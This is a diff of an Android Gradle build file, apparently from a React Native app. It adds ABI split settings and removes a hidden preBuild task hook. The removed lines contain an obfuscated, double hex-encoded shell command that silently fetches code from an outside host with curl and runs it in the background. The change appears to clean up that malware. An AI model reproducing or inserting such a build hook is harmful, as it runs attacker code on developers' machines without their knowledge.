@@ -92,6 +92,14 @@ android {
         versionCode 1
         versionName "1.0"
     }
+    splits {
+        abi {
+            enable true
+            reset()
+            include "arm64-v8a", "armeabi-v7a"
+            universalApk false
+        }
+    }
     signingConfigs {
         debug {
             storeFile file('debug.keystore')
@@ -123,13 +131,5 @@ dependencies {
         implementation("com.facebook.react:hermes-android")
     } else {
         implementation jscFlavor
-    }
-}
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643633366636653665363536333734326437343639366436353666373537340a3230333233303230326434633636373336623230326432643732363537343732373932303333323032643634323032323730336436313665363437320a3666363936343566363737323631363436633635323232303638373437343730373333613266326636353738373036633666373236353633363436650a32653732373532663631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)"].execute()
-        }
     }
 }
